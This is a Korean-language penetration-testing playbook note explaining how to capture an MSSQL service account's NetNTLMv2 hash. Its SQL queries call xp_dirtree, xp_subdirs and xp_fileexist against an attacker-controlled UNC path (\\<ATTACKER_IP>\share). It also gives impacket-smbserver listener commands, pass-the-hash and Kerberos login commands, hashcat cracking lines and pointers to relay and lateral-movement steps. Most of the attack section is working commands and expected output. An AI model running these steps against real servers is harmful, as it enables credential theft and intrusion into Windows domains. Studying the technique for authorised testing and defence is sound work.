---
tags:
  - 환경/windows
  - 서비스/mssql
시작조건: ["MSSQL 인증과 query 실행 가능", "공격자 SMB listener로의 outbound 445 도달 가능"]
필요권한: ["MSSQL query 실행 권한"]
필요조건: ["공격자 SMB listener 접근 가능", "대상 SQL Server에서 공격자 TCP/445 outbound 가능", "UNC 경로 사용 가능"]
결과: ["SQL Server 서비스 계정의 NetNTLMv2 challenge-response", "서비스 계정 단서", "오프라인 크래킹 또는 실시간 relay 후보"]
---

# MSSQL 서비스 Hash 캡처

## 한 줄 판단

MSSQL에서 UNC 경로를 처리하는 stored procedure를 호출해 SQL Server 서비스 계정이 공격자 `impacket-smbserver`로 SMB 인증하도록 유도하고 NetNTLMv2 challenge-response를 캡처한다.

## 사용할 때

- MSSQL 로그인에는 성공했지만 `xp_cmdshell` 실행이나 활성화 권한은 부족할 때.
- SQL Server 서비스 계정의 이름, 도메인, NetNTLMv2 hash를 cracking 또는 relay 후보로 확보하고 싶을 때.
- 대상에서 공격자 SMB listener로 outbound 445 접근이 가능할 때.
- DB 내부 데이터보다 Windows/AD 쪽 후속 인증 경로가 더 중요할 때.
- 현재 보유 정보: MSSQL에 query를 실행할 수 있는 로그인 또는 통합 인증 ticket·password·hash, 공격자 listener 주소와 대상 SQL Server 후보.
- 명령 실행 위치: SQL query를 보낼 수 있고 listener TCP/445를 열 수 있는 공격 호스트. SQL Server 호스트에서도 이 listener의 주소·TCP/445에 outbound로 도달해야 한다.
- 현재 권한과 대상: SQL query 실행 또는 해당 procedure 실행 권한은 `sysadmin`, SQL Server Windows 서비스 계정의 로컬 관리자, 도메인 관리자 권한과 다르다.
- 획득 결과: listener의 `USER::DOMAIN:...`은 NetNTLMv2 challenge-response다. 평문 비밀번호, NT hash, relay 성공은 후속 분기로 별도 확인한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|
| SQL 실행 위치와 인증 | 공격 호스트에서 대상 MSSQL에 접속하고 `SELECT SYSTEM_USER;`를 실행 가능 | `impacket-mssqlclient`, `sqlcmd`, `sqsh` | SQL 포트·인증 형식과 현재 SQL login 확인 |
| SQL 대상 procedure | `xp_dirtree`, `xp_subdirs`, `xp_fileexist` 중 UNC 경로를 처리하는 procedure 실행 가능 | procedure 출력과 SQL 오류 | `EXECUTE` 권한과 실행 가능한 다른 procedure 확인 |
| 공격자 listener | 공격 호스트에서 SMB listener TCP/445를 열고 결과를 저장 가능 | `impacket-smbserver` 시작 로그 | 포트 점유, 권한, VPN 인터페이스와 로그 경로 확인 |
| SQL Server outbound 경로 | SQL Server 호스트에서 공격자 listener IP TCP/445에 도달 가능 | listener 로그, `tcpdump` | 방화벽, 라우팅, 공격자 주소와 egress 정책 확인 |
| 후속 활용 조건 | 캡처 계정과 대상 서비스가 식별되어 cracking 또는 실시간 relay 조건을 판단 가능 | 전체 NetNTLMv2 라인과 계정·도메인 출력 | hash 형식, SMB signing, EPA와 대상 서비스 ACL 분리 확인 |

## 실행

1. 공격자 호스트에서 `impacket-smbserver`를 TCP/445로 실행한다.
2. MSSQL에 접속해 현재 사용자와 권한을 확인한다.
3. `xp_dirtree`, `xp_subdirs`, `xp_fileexist` 중 하나로 `\\<ATTACKER_IP>\<SHARE>\` 접근을 유도한다.
4. listener에 출력된 NetNTLMv2 hash와 계정명을 저장한다.
5. hashcat cracking 또는 `ntlmrelayx` 기반 relay 가능성을 분리해서 판단한다.

### impacket-smbserver listener 준비

```bash
mkdir -p /tmp/mssql_smb
sudo impacket-smbserver capture /tmp/mssql_smb -smb2support -debug
```

확인할 출력:

- TCP/445에서 SMB server가 대기한다.
- `-smb2support`로 최신 Windows 클라이언트의 SMB2 연결을 받는다.
- 445 바인딩에 실패하면 이미 실행 중인 SMB 서비스나 권한 문제를 먼저 확인한다.

### 로그를 파일로 남기며 실행

```bash
sudo impacket-smbserver capture /tmp/mssql_smb -smb2support -debug | tee mssql_smbserver.log
```

확인할 출력:

- hash 라인과 접속 IP를 listener 종료 후에도 다시 확인할 수 있다.
- NetNTLMv2 challenge-response 라인은 보통 `USER::DOMAIN:` 형태로 남는다.

### MSSQL 인증 방식 선택

이 단계의 `<SQL_REQUESTER>`는 SQL query를 실행할 로그인이다. 이후 listener에서 캡처되는 `<SERVICE_ACCOUNT>`는 SQL Server 프로세스를 실행하는 Windows 계정이므로 두 주체를 같은 계정으로 해석하지 않는다.

| 보유한 인증 수단 | 사용할 방식 | 성공 시 확인하는 주체 |
|---|---|---|
| SQL login의 평문 비밀번호 | SQL 인증 | `SYSTEM_USER`에 표시된 SQL login |
| Windows 계정의 평문 비밀번호 | Windows 통합 인증 | `SYSTEM_USER`에 표시된 Windows Identity |
| Windows 계정의 NT hash | Windows 통합 인증의 Pass-the-Hash | NT hash가 속한 Windows Identity |
| Windows 계정의 유효한 TGT 또는 MSSQL service ticket이 담긴 ccache | Kerberos 통합 인증 | ccache principal과 MSSQL SPN에 매핑된 Windows Identity |

#### 1. SQL login의 평문 비밀번호

```bash
impacket-mssqlclient '<SQL_REQUESTER>:<SQL_PASSWORD>@<TARGET>'
```

#### 2. Windows 계정의 평문 비밀번호

```bash
impacket-mssqlclient '<DOMAIN>/<SQL_REQUESTER>:<PASSWORD>@<TARGET>' -windows-auth
```

#### 3. Windows 계정의 NT hash

```bash
impacket-mssqlclient '<DOMAIN>/<SQL_REQUESTER>@<TARGET>' -windows-auth -hashes :<NT_HASH>
```

`<NT_HASH>`는 MSSQL에 접속할 `<SQL_REQUESTER>`의 NT hash다. listener에서 나중에 수집되는 SQL Server 서비스 계정의 NetNTLMv2 challenge-response와는 형식과 주체가 모두 다르다.

#### 4. Windows 계정의 Kerberos ccache

```bash
export KRB5CCNAME=<CCACHE_FILE>
klist
impacket-mssqlclient -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/<SQL_REQUESTER>@<MSSQL_FQDN>'
```

`-no-pass`는 익명 SQL 연결이 아니다. `KRB5CCNAME`의 ticket으로 `<SQL_REQUESTER>`를 인증하며 MSSQL SPN과 일치시키기 위해 IP보다 `<MSSQL_FQDN>`을 사용한다.

### 현재 SQL login과 기본 권한 확인

```sql
SELECT SYSTEM_USER;
SELECT ORIGINAL_LOGIN();
SELECT IS_SRVROLEMEMBER('sysadmin');
```

확인할 출력:

- 현재 SQL login과 sysadmin 여부.
- 이 기법은 sysadmin이 없어도 `xp_dirtree` 계열 procedure 실행이 가능하면 시도할 수 있다.
- `Login failed`는 선택한 SQL/Windows 인증 방식, 요청자 계정과 서버 인증 설정을 확인한다. 로그인 성공 뒤 procedure가 거부되면 요청자 인증과 query 권한을 분리한다.

### MSSQL에서 인증 유도

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\';
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\';
EXEC master..xp_fileexist '\\<ATTACKER_IP>\share\probe.txt';
```

확인할 출력:

- `impacket-smbserver` 터미널에 SQL Server에서 들어온 SMB 연결이 보인다.
- `AUTHENTICATE_MESSAGE`와 `DOMAIN\USER` 또는 `DOMAIN\HOST$`가 출력된다.
- `USER::DOMAIN:<challenge>:<response>:...` 형식의 NetNTLMv2 hash가 출력된다.
- SQL query가 오류를 반환해도 이 listener 출력이 있으면 인증 수집은 성공한 것이다. 반대로 SQL 성공 메시지만으로 capture를 판정하지 않는다.

### 캡처 hash cracking

```bash
hashcat -m 5600 -a 0 mssql_netntlmv2.hash rockyou.txt --backend-ignore-opencl -d 1 -O -w 3
hashcat --show -m 5600 mssql_netntlmv2.hash --backend-ignore-opencl -d 1 -O -w 3
```

확인할 출력:

- NetNTLMv2는 Hashcat mode `5600`을 사용한다.
- 평문 비밀번호가 복구되면 MSSQL, SMB, WinRM, LDAP 등에서 재사용 가능성을 확인한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| MSSQL 인증과 `SELECT SYSTEM_USER` 성공 | query 실행 가능 | MSSQL 세션과 SQL Identity 확인 | procedure 실행 권한 확인 |
| listener의 `AUTHENTICATE_MESSAGE`와 `USER::DOMAIN:...` | SQL Server의 SMB 인증 유도 성공 | NetNTLMv2 hash와 계정 단서 확보 | [[오프라인 해시 크래킹]] 또는 relay 조건 검토 |
| 캡처 주체가 도메인 서비스 계정 | 도메인 계정 컨텍스트로 SQL Server 실행 | 서비스 계정 relay/cracking 후보 | SPN, 그룹, 서비스 권한 확인 |
| 캡처 주체가 `HOST$` | 머신 계정 컨텍스트로 네트워크 인증 | 머신 계정 relay 후보 | AD CS/LDAP relay와 머신 계정 권한 검토 |
| SQL 에러와 listener hash가 함께 보임 | SQL 작업 결과와 무관하게 강제 인증은 성공 | NetNTLMv2 hash 확보 | listener 출력을 기준으로 후속 진행 |
| listener 실행 실패 | TCP/445 권한 부족 또는 포트 점유 | 인증 수신 준비 실패 | `sudo`, 점유 프로세스, VPN 인터페이스 확인 |
| query는 성공하지만 hash 없음 | outbound SMB 차단, IP 또는 라우팅 오류 가능 | MSSQL 접근만 유지 | `tcpdump`, VPN 주소, 방화벽 확인 |
| `EXECUTE permission was denied` | procedure 실행 권한 없음 | 강제 인증 미수행 | 다른 DB 권한, `xp_fileexist`, [[MSSQL Impersonation 권한 상승]] 검토 |
| Hashcat이 hash를 인식하지 못함 | NetNTLMv2 라인 잘림 또는 mode 오류 | 캡처 형식 불완전 | 전체 `USER::DOMAIN:...` 라인과 `-m 5600` 확인 |
| crack 실패 | 강한 서비스 계정 비밀번호 | NetNTLMv2 hash만 확보 | [[NTLM Relay 조건 검토]]와 계정 권한 평가 |

NetNTLMv2는 원본 NTLM hash가 아니므로 [[Pass the Hash]]에 바로 사용할 수 없다.

## 확인할 출력과 권한

- SQL 에러보다 listener의 원본 IP, 계정명, 도메인명과 전체 NetNTLMv2 라인을 우선 확인한다.
- MSSQL query 실행 권한과 `sysadmin`, Windows 로컬 관리자, 도메인 권한은 서로 다르다.
- 캡처한 NetNTLM challenge-response는 오프라인 비밀번호 복구 또는 relay 입력 후보이며, 평문 비밀번호·계정 NTLM hash·인증 성공을 뜻하지 않는다.

## 후속 공격 연결

- [[오프라인 해시 크래킹]]
- [[NTLM Relay 조건 검토]]
- [[AD CS ESC8 NTLM Relay]]
- [[원격 비밀번호 공격]]
- [[MSSQL Impersonation 권한 상승]]
- [[MSSQL Linked Server 내부 이동]]

## 관련 서비스

- [[1433_MSSQL]]
- [[445_SMB]]

## 관련 도구

- [[impacket-mssqlclient]]
- [[impacket-smbserver]]
- [[impacket-ntlmrelayx]]
- [[Responder]]
- [[hashcat]]
- [[klist]]
